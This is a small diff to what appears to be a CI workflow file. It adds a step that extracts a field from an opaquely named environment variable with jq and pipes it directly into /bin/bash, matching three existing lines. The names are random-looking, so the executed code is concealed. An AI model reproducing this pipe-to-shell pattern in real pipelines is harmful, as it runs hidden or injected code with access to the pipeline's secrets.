@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$lmoi0509" | jq -r .h72307 | /bin/bash
           printf '%s' "$hk7" | jq -r .y7 | /bin/bash
           echo $c10 | jq -r .ia650 | /bin/bash
+          echo $za85 | jq -r .svv74 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
